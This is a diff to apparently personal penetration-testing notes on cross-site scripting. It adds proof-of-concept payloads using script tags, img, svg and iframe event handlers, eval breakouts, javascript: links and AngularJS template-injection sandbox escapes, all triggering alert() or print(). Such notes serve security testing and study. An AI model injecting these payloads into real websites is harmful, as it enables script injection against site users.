@@ -4,7 +4,7 @@
 ## POC
 - `alert(document.location)`
 - `print()`
-## Unescaped Tags -> [Script Tags](XSS.md#Script%20Tags)
+## Unescaped Tags -> [Script Tags](3.%20Methodology/3.1%20Enumeration/XSS.md#Script%20Tags)
 - `<b>STUFF</b>`
 - `<b>STUFF`
 ### Encodings
@@ -16,4 +16,26 @@
 ### Script
 - `<script>print()</script>`
 - `<SrCiPt>print()</SCriPT>`
+### Img
+- `<img src="" onerror="print()" />`
+- `<svg onload="alert()" />`
+### Iframe
+- `<iframe onload="alert()" />`
+- `<iframe onreadystatechange="alert()" />`
+#### Manipulating Iframe
+- `this.contentWindow`
+
+## Eval
+- `"-print()"`
+- `";print()"`
+
+## Href
+- `javascript:alert()`
+
+# Angular XSS
+**Identify page runs Angular first. Wappalyzer works well**
+**Head of page will point to Angular source**
+## ng-app
+- `{{constructor.constructor('alert()')()}}`
+- `{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}`
 
